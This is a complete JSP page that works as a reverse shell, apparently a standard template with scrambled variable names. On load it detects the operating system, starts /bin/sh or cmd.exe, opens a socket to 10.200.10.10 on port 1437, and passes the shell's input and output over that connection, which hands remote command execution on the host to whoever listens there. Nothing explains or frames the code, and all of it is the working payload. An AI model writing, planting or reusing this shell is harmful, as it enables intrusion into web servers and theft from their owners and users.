<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream bo;
    OutputStream ud;

    StreamConnector( InputStream bo, OutputStream ud )
    {
      this.bo = bo;
      this.ud = ud;
    }

    public void run()
    {
      BufferedReader gy  = null;
      BufferedWriter pbm = null;
      try
      {
        gy  = new BufferedReader( new InputStreamReader( this.bo ) );
        pbm = new BufferedWriter( new OutputStreamWriter( this.ud ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = gy.read( buffer, 0, buffer.length ) ) > 0 )
        {
          pbm.write( buffer, 0, length );
          pbm.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( gy != null )
          gy.close();
        if( pbm != null )
          pbm.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.200.10.10", 1437 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
